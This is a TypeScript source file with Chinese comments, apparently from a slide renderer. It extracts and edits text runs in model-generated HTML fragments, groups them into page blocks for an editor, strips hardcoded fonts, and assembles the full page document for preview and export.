  /** 所在元素实例的编号。算 `siblings` 用——同一个标签出现两次是两回事 */
  parentId: number;
  /** 从最外层到直接父元素的实例编号链。分区块与小组要靠它 */
  chain: number[];
}

/**
 * 按文档序扫出所有**非空白文本节点**的区间。
 *
 * 与 `scanTags` 同一套路数（正则 + 栈），但不复用它的输出：它记的是元素区间，
 * 而这里要的是「两个标签之间那一段裸文本」，还得知道它挂在哪个元素下面。
 *
 * 三处必须跳过，否则列出来的「文字」里会混进不该出现的东西：
 * - **`<style>` / `<script>` / `<title>` 的内容**：模型写的页面里 `<style>` 有几千字符，
 *   不跳过的话右栏第一屏全是 CSS
 * - **HTML 注释**：模型爱写 `<!-- 3. 中部标题组 -->`，里面的中文会被当成正文
 * - **纯空白的文本节点**：标签之间的缩进与换行
 */
function scanTextRuns(fragment: string): { runs: RawRun[]; tags: string[] } {
  // 一条正则同时认「标签」与「注释」：注释整段吃掉，它里面的 `<` `>` 才不会把栈搞乱
  const re = /<(\/?)([a-zA-Z][\w-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>|<!--[\s\S]*?-->/g;
  const stack: { tag: string; id: number }[] = [];
  const runs: RawRun[] = [];
  /** 实例编号 → 标签名。分区块时要知道某一层是什么标签 */
  const tags: string[] = [];
  let skipDepth = 0;
  let idSeq = 0;
  let cursor = 0;

  const takeText = (start: number, end: number) => {
    if (skipDepth > 0 || end <= start) return;
    if (fragment.slice(start, end).trim() === '') return;
    const parent = stack[stack.length - 1];
    runs.push({
      start, end,
      tag: parent?.tag ?? '',
      parentId: parent?.id ?? -1,
      chain: stack.map((n) => n.id),
    });
  };

  let m: RegExpExecArray | null;
  while ((m = re.exec(fragment)) !== null) {
    // 上一个标签到这个标签之间，就是一段裸文本
    takeText(cursor, m.index);
    cursor = re.lastIndex;

    if (m[0].startsWith('<!--')) continue;
    const tag = (m[2] ?? '').toLowerCase();
    if (m[1] === '/') {
      const at = stack.map((n) => n.tag).lastIndexOf(tag);
      if (at >= 0) {
        for (let i = at; i < stack.length; i += 1) {
          if (SKIP_TEXT_TAGS.has(stack[i]!.tag)) skipDepth -= 1;
        }
        stack.length = at;
      }
      continue;
    }
    // 空元素（img / br）没有内容区间，也不该压栈——压进去后面的兄弟会被算成它的孩子
    if (VOID_TAGS.has(tag) || (m[3] ?? '').trimEnd().endsWith('/')) continue;
    if (SKIP_TEXT_TAGS.has(tag)) skipDepth += 1;
    tags[idSeq] = tag;
    stack.push({ tag, id: idSeq });
    idSeq += 1;
  }
  takeText(cursor, fragment.length);
  return { runs, tags };
}

/**
 * 实体解码。**只认最常见的这几个**——认不出的原样留着，反正只有被改过的段才会被写回，
 * 没动过的段一个字符都不会变。
 */
function decodeEntities(text: string): string {
  return text.replace(/&(amp|lt|gt|quot|#39|nbsp);/g, (all, name: string) => ({
    amp: '&', lt: '<', gt: '>', quot: '"', '#39': "'", nbsp: ' ',
  }[name] ?? all));
}

/** 裸区间 → `TextRun[]`。`textRunsOf` 与 `textBlocksOf` 共用，段号因此天然一致 */
function toRuns(fragment: string, raw: RawRun[]): TextRun[] {
  const totals = new Map<number, number>();
  for (const r of raw) totals.set(r.parentId, (totals.get(r.parentId) ?? 0) + 1);
  const seen = new Map<number, number>();
  return raw.map((r, i) => {
    const ordinal = seen.get(r.parentId) ?? 0;
    seen.set(r.parentId, ordinal + 1);
    return {
      i,
      text: decodeEntities(fragment.slice(r.start, r.end)),
      tag: r.tag,
      ordinal,
      siblings: totals.get(r.parentId) ?? 1,
    };
  });
}

/** 一页里所有可编辑的文字段，按文档序 */
export function textRunsOf(fragment: string): TextRun[] {
  return toRuns(fragment, scanTextRuns(fragment).runs);
}

/**
 * 把改过的文字段写回片段。**没在 `edits` 里的段一个字符都不动。**
 *
 * 倒序应用：改一段会让它后面所有段的区间右移，从后往前改才不会挤偏前面。
 * 写回前转义 `& < >`——用户输入里带一个 `<` 就能把整页 HTML 打坏。
 */
export function applyTextRuns(fragment: string, edits: readonly { i: number; text: string }[]): string {
  if (edits.length === 0) return fragment;
  const raw = scanTextRuns(fragment).runs;
  const wanted = new Map(edits.map((e) => [e.i, e.text]));
  let out = fragment;
  for (let i = raw.length - 1; i >= 0; i -= 1) {
    const next = wanted.get(i);
    if (next === undefined) continue;
    const r = raw[i]!;
    out = out.slice(0, r.start) + escapeHtml(next) + out.slice(r.end);
  }
  return out;
}

/** 一个小组：区块里的一个子块，以及它下面的文字 */
export interface TextGroup {
  /** 稳定编号（元素在片段里的实例号），React key 与「展开哪一组」都用它 */
  key: number;
  tag: string;
  /** 界面上的组名。取这一组里第一段「像标题」的文字，取不到就退回标签名 */
  label: string;
  runs: TextRun[];
}

/**
 * 一个区块：页面上**明显的一块**（页头、正文、页脚…），里面可能还有小组。
 *
 * 一页几十条文字平铺着列出来是没法用的——用户的原话是「文字内容太多」。
 * 按页面的真实结构分层之后，先看到的是「这一页分几块」，点开哪块才看到哪块的文字。
 */
export interface TextBlock {
  key: number;
  tag: string;
  /** 界面上的区块名，见 `BLOCK_LABEL` */
  label: string;
  /** 文字不多时直接平铺；多到要分组时这里是空的 */
  runs: TextRun[];
  groups: TextGroup[];
}

/**
 * 区块名。**只翻译一眼认得出的那几个**，其余用标签名原样——
 * 给 `div` / `svg` 编一套中文名反而让人对不上页面里实际是什么。
 */
const BLOCK_LABEL: Record<string, string> = {
  header: '页头', main: '正文', footer: '页脚',
  aside: '侧栏', nav: '导航', section: '区块', article: '条目', figure: '图注',
};

/**
 * 超过这么多条才分组，分组之后再超过就继续往下切。
 *
 * **同一个阈值管两头**：低于它平铺（页头那三条摆成三层比平铺还长），
 * 高于它就一定再切一刀，免得出现「一个组里 47 条」这种没帮上忙的分组。
 */
const GROUP_MIN_RUNS = 12;

/** 往下切的层数上限。模型偶尔会套很多层 `div`，无上限地切会把一条文字切到最深那层 */
const GROUP_MAX_DEPTH = 3;

/**
 * 这一段像不像个标题。
 *
 * 判它是为了让组名有意义：组的开头常常是**装饰性的大数字**（「01」「P3–P5」「95%」），
 * 拿它当组名等于没名字。规则很土但管用——太短的不要、又短又带数字的不要。
 */
function isTitleish(text: string): boolean {
  const s = text.replace(/\s+/g, ' ').trim();
  if (s.length < 4) return false;
  if (s.length < 8 && /\d/.test(s)) return false;
  return true;
}

function labelOf(text: string, fallback: string): string {
  const one = text.replace(/\s+/g, ' ').trim();
  if (one === '') return fallback;
  return one.length > 14 ? `${one.slice(0, 14)}…` : one;
}

function groupLabel(runs: TextRun[], tag: string): string {
  // 只看前几条：组名要的是「这一组开头在讲什么」，翻到后面去挑会把标题挑成正文
  const hit = runs.slice(0, 6).find((r) => isTitleish(r.text));
  return labelOf((hit ?? runs[0])?.text ?? '', tag);
}

/**
 * 把一页的文字按「区块 → 小组 → 文字」分好。
 *
 * ## 区块怎么认
 *
 * **最外层元素的直接孩子**。看真实数据，模型写出来的页面几乎都是
 * `<div class="stage">` 里装 `header / main / footer`（外加一两个装饰块），
 * 那就是人眼里的「这一页分几块」。片段有多个顶层元素时，每个各算一块。
 *
 * ## 小组怎么认
 *
 * 从区块的孩子往下走，**哪一层能把文字切到 `GROUP_MIN_RUNS` 以内就停在哪一层**。
 * 页头那种三条文字的直接平铺；正文那种几十条的会一路切到「一张卡片」这一级。
 * 不这么切的话，第 2 页的正文就是一个「47 条」的组，分组等于没分。
 */
export function textBlocksOf(fragment: string): TextBlock[] {
  const { runs: raw, tags } = scanTextRuns(fragment);
  const all = toRuns(fragment, raw);

  interface Node { id: number; children: number[]; own: number[]; sub: number[] }
  const nodes = new Map<number, Node>();
  const node = (id: number): Node => {
    let n = nodes.get(id);
    if (!n) { n = { id, children: [], own: [], sub: [] }; nodes.set(id, n); }
    return n;
  };

  for (const [i, r] of raw.entries()) {
    for (const [k, id] of r.chain.entries()) {
      node(id).sub.push(i);
      const parent = r.chain[k - 1];
      if (parent !== undefined && !node(parent).children.includes(id)) node(parent).children.push(id);
    }
    const parent = r.chain[r.chain.length - 1];
    if (parent !== undefined) node(parent).own.push(i);
  }

  const runsOf = (id: number): TextRun[] => (nodes.get(id)?.sub ?? []).map((i) => all[i]!);

  /** 把一棵子树切成若干小组。切不动了就把整棵当一个组 */
  const flatten = (id: number, depth: number): TextGroup[] => {
    const n = nodes.get(id);
    if (!n) return [];
    const kids = n.children.filter((c) => (nodes.get(c)?.sub.length ?? 0) > 0);
    if (n.sub.length <= GROUP_MIN_RUNS || kids.length < 2 || depth >= GROUP_MAX_DEPTH) {
      const runs = runsOf(id);
      return runs.length === 0 ? [] : [{ key: id, tag: tags[id] ?? '', label: groupLabel(runs, tags[id] ?? ''), runs }];
    }
    return kids.flatMap((c) => flatten(c, depth + 1));
  };

  // 区块按文档序：第一次出现在哪一段的祖先链上就排第几
  const blockIds: number[] = [];
  for (const r of raw) {
    const id = r.chain.length >= 2 ? r.chain[1]! : r.chain[0];
    if (id !== undefined && !blockIds.includes(id)) blockIds.push(id);
  }

  return blockIds.map((id) => {
    const tag = tags[id] ?? '';
    const runs = runsOf(id);
    const groups = runs.length > GROUP_MIN_RUNS
      ? (nodes.get(id)?.children ?? []).flatMap((c) => flatten(c, 0))
      : [];
    return {
      key: id,
      tag,
      label: BLOCK_LABEL[tag] ?? tag,
      // 分了组就把文字全放进组里，不在区块上留一份（否则同一段会出现两次）
      runs: groups.length > 0 ? [] : runs,
      groups,
    };
  });
}

export interface PageDocumentOptions {
  palette: StylePalette;
  fontFamily: string;
  /**
   * 展示字体栈，注入成 `--font-display`：大标题、衬线标题用。
   *
   * **不传就是 `var(--font-sans)`**——老调用点不必改，行为与从前逐字一致。
   * 与 `fontFamily` 是两个**角色**而不是两个备选：正文黑体、标题宋体是常态。
   */
  fontDisplay?: string;
  /** 手写体栈，注入成 `--font-script`。不传就跟着 `--font-display` 走 */
  fontScript?: string;
  /** 数字栈，注入成 `--font-numeric`：指标值、大号序号用。不传就跟着 `--font-display` 走 */
  fontNumeric?: string;
  /** 按 data-lumen-image 的下标填图，下标从 1 开始 */
  images?: StockImage[];
  /** 页面标题，只在浏览器标签上有意义 */
  title?: string;
  /**
   * 动效。默认 `'play'`（编辑器、演示、样机都要动）。
   * **导出必须显式传 `'none'`**：截图要的是落点那一帧，不是中途。
   */
  motion?: 'play' | 'none';
  /**
   * 元素逐块进场的种子。传页码（或页下标）就逐块进场、并按它轮换方向；
   * 不传或传 null 就不逐块。`motion: 'none'` 时一律不生效。
   */
  staggerSeed?: number | null;
  /**
   * 项目品牌。不传就是「没有品牌」，槽位原样不动——行为与改动前完全一致。
   * 由 `brandOf(project)` 从项目行翻出来。
   */
  brand?: BrandSlot;
  /**
   * 用户在图位面板上做过的调整（换图 / 删图），按图位次序索引。
   *
   * 传了就**优先于素材库自动配的那张**。不传则行为与改动前逐字一致。
   */
  overrides?: ImageOverrides;
  /**
   * 图位的鼠标悬停反馈（`HOVER_CSS`）。默认关。
   *
   * **只给「看样机」的场合开**——功能库的放大演示、风格库预览这类。
   * 工作台画布里用户正在图位上拖拽，图跟着鼠标抬起来只会碍事；演示态没人悬停；
   * 导出是截图。三处都不传，行为与改动前逐字一致。
   */
  hover?: boolean;
  /**
   * 「正在生成」的揭示态：把元素标上阅读序、但先藏起来，交给外层逐个点亮。
   *
   * 只有工作台那个生成进度动画会传。传了之后 `staggerSeed` 不再起作用——
   * 两者都是「元素逐个出现」，同时开就是两套动画抢同一批元素。
   */
  reveal?: boolean;
  /**
   * 图表槽的渲染函数。**由调用方注入**（`@lumen/charts` 的 `makeChartRenderer`）。
   *
   * 本包不能反向依赖图表包（那边依赖本包，会成环），所以这里只收一个回调：
   * 谁渲染谁传进来。不传的话图表槽会被换成占位块而不是原样留着——
   * 留着的话页面上会出现一段裸露的 JSON 文本。
   */
  renderChart?: ChartRenderFn;
}

/**
 * 剥掉片段里**自己写死的字体**：既包括 `font-family` 的字面栈，也包括
 * 在 `:root` 里重新定义 `--font-*` 的那几行。
 *
 * ## 两种写法，同一个后果
 *
 * - **`font-family` 写字面栈**：风格提示词常常把字体栈写进去（「正文与标题统一使用
 *   系统无衬线字体栈：-apple-system, "Segoe UI", …」），模型照办，于是页面里出现
 *   `.stage{font-family:-apple-system,…}`。类选择器比本文档里的
 *   `body{font-family:var(--font-sans)}` 更具体，直接盖掉。实测 76 页里有 9 页。
 * - **在 `:root` 里重新定义 `--font-*`**：提示词的「代码要求」写着「在 :root 中定义
 *   CSS 变量（… --font-sans / --font-display / --font-script）」，模型就把真栈抄了进去。
 *   片段那份 `:root` 排在 `<body>` 里、比本文档 `<head>` 里的晚，同优先级下它赢。
 *   实测 96 页里有 34 页是这样。
 *
 * 两者的后果一样：**在风格库里换字体，页面纹丝不动**，而界面上看不出任何异常。
 * 所以都堵在组装这一步——不指望模型不写，写了也不让它生效。
 *
 * ## 为什么是「剥掉」而不是「抬优先级」
 *
 * 抬优先级（比如把注入那条写成 `:root:root`）只压得住 `:root` 与类选择器，
 * 压不住片段写在 `body` 上或 `#id` 上的定义。剥掉则是釜底抽薪：
 * 片段里不再有任何字体来源，渲染层注入的那份就是唯一的一份。
 *
 * 不碰 `@font-face`：那里面的 `font-family:"Cormorant Garamond"` 是在**声明**
 * 一个字体名，不是在选字体，剥掉打包字体就全废了。
 */
export function stripHardcodedFonts(html: string): string {
  // 先把 @font-face 整块挖出来占位，剥完再放回去
  const faces: string[] = [];
  const masked = html.replace(/@font-face\s*\{[^}]*\}/gi, (m) => {
    faces.push(m);
    return `\u0000${faces.length - 1}\u0000`;
  });
  const cleaned = masked
    .replace(
      /font-family\s*:\s*([^;}]*)(;|\}|$)/gi,
      (whole, value: string, tail: string) => (/var\(--font-/.test(value) ? whole : tail),
    )
    // 变量定义整条删掉，连分号一起——留着空声明只是噪音
    .replace(/--font-(?:sans|display|script|numeric)\s*:\s*[^;}]*;?/gi, '');
  return cleaned.replace(/\u0000(\d+)\u0000/g, (_, i: string) => faces[Number(i)]!);
}

/**
 * 单页文档。iframe 的 `srcdoc` 与导出都吃这一份，保证两处长得一样。
 *
 * 外层不设 `transform: scale()`——缩放由调用方在 iframe 元素上做，
 * 文档内部永远是 1920×1080，这样截图与打印拿到的就是原生分辨率。
 */
export function buildPageDocument(fragment: string, opts: PageDocumentOptions): string {
  const playing = opts.motion !== 'none';
  // 揭示态优先：它也要标记，但注入的是「先藏起来」而不是「自己播一遍」
  const reveal = opts.reveal === true;
  const stagger = !reveal && playing && opts.staggerSeed != null;
  /**
   * 有配图、或者有图位调整时都要过一遍 `fillImageSlots`。
   *
   * 单看「有没有配图」是不够的：用户可能把这一页的图全删了（overrides 里全是
   * `hidden`），那时 `images` 是空的，但删图这件事必须落到 HTML 上。
   */
  const hasOverrides = Object.keys(opts.overrides ?? {}).length > 0;
  /*
    先剥写死的 `font-family`，再填图。后面几步都要解析 HTML，先后无所谓，
    但放在最前面就不必把一个带着几十处死字体的串来回搬。
  */
  const stripped = stripHardcodedFonts(fragment);
  let body = (opts.images?.length ?? 0) > 0 || hasOverrides
    ? fillImageSlots(stripped, opts.images ?? [], opts.overrides ?? {})
    : stripped;
  /*
    图表槽在配图之后、逐块进场之前填。

    **顺序在这里是有讲究的**：
    - 排在 `stripHardcodedFonts` 之后——出图的 SVG 里带 `font-family`，
      让它被同一套剥法处理，图上文字才会跟着 `var(--font-sans)` 走
    - 排在 `markStaggerItems` 之前——图整块作为一个元素参与进场，
      排在后面的话它会是页面上唯一一个不动的块

    `renderChart` 没传时也要过一遍（`fillChartSlots` 用空渲染器），
    否则槽里那段 JSON 会作为正文裸露在页面上。
  */
  body = fillChartSlots(body, opts.renderChart ?? (() => ''));
  // 品牌槽位在逐块进场之前填：填完才谈得上「哪些元素要进场」，
  // 否则 logo 会被当成一个新元素漏掉，进场顺序里没有它
  if (opts.brand) body = fillBrandSlots(body, opts.brand, opts.palette.brand);
  if (stagger) body = markStaggerItems(body, staggerDirectionFor(opts.staggerSeed!));
  // 揭示态用同一套标记，方向取 'up'：这里的方向不参与动画，只是 `markStaggerItems` 的必填参数
  else if (reveal) body = markStaggerItems(body, 'up');
  return [
    '<!DOCTYPE html>',
    '<html lang="zh-CN">',
    '<head>',
    '<meta charset="utf-8">',
    `<title>${escapeHtml(opts.title ?? '')}</title>`,
    '<style>',
    /*
      `@font-face` 排在最前面，后面片段自己那份 `<style>` 覆盖不到它——
      两边同名规则时后者赢，而字体栈的取值是「先声明先匹配」，
      片段里只会写 `font-family:var(--font-display)`，不会自己再声明 @font-face。
    */
    bundledFontFaceCss(),
    /*
      配色：**片段自己那份 :root 在后面，会覆盖这里的同名变量**，这是有意的——
      片段里的色值是生成时按调色板写死的，两边本来就该一致，谁赢都一样。
    */
    `:root { ${paletteVars(opts.palette)} }`,
    /*
      字体变量单独一条，并且双写 `:root`。

      真正把片段里写死的字体挡在外面的是下面那次 `stripHardcodedFonts`——
      它把 `--font-*` 的定义整条删掉，釜底抽薪。这一条是**兜底**：
      正则是在模型生成的 CSS 上跑的，总有它没料到的写法，而
      `:root:root` 匹配的还是同一个元素、优先级却从 (0,1,0) 提到 (0,2,0)，
      片段不管把 `:root` 写在哪都压不过它。字体必须由渲染层说了算，
      这一点值得多一道保险。
    */
    `:root:root { --font-sans: ${opts.fontFamily}; ${fontVars(opts)} }`,
    `html, body { margin: 0; padding: 0; width: ${CANVAS_WIDTH}px; height: ${CANVAS_HEIGHT}px; overflow: hidden; }`,
    '*, *::before, *::after { box-sizing: border-box; }',
    `body { font-family: var(--font-sans); }`,
    IMAGE_SLOT_CSS,
    // 逐块进场的规则与导出静帧互斥：导出时连这一段都不注入，截图就不会撞上动画中途
    stagger ? STAGGER_CSS : (playing ? '' : STATIC_CSS),
    // 揭示态不自播，所以与 `motion` 无关；排在上面那行之后，两者不会同时出现
    reveal ? REVEAL_CSS : '',
    // 悬停反馈排在后面：`motion: 'none'` 时 `STATIC_CSS` 的 `!important` 照样压得住它
    opts.hover ? HOVER_CSS : '',
    '</style>',
    '</head>',
    '<body>',
    body,
    '</body>',
    '</html>',
  ].join('\n');
}

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]!
  ));
}
